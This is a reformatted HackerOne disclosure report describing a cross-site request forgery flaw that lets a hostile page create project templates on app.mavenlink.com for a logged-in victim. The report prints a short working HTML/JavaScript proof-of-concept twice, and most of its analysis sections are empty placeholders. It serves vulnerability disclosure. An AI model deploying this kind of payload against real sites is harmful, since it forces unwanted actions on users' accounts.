# CSRF Add user templates

## Metadata
- **Source:** HackerOne
- **Report:** 301919 | https://hackerone.com/reports/301919
- **Submitted:** 2018-01-03
- **Reporter:** tolo7010
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Reproduction:
==========

- Log in to account
- Visit CSRF page below (note default 30 seconds timeout, can be adjusted according to the connection speed): 

```
<!doctype html>
<html>
<head>
</head> 
<body>
<script>
var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
var intervalID = setTimeout(function () { a.close();}, 30000); 
</script>
</bo

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Reproduction:
==========

- Log in to account
- Visit CSRF page below (note default 30 seconds timeout, can be adjusted according to the connection speed): 

```
<!doctype html>
<html>
<head>
</head> 
<body>
<script>
var a = window.open("https://app.mavenlink.com/project_templates#new", "csrf", "height=100,width=100"); 
var intervalID = setTimeout(function () { a.close();}, 30000); 
</script>
</body>
</html>
```

## Impact

CSRF Add user templates

</details>

---
*Analysed by Claude on 2026-05-24*
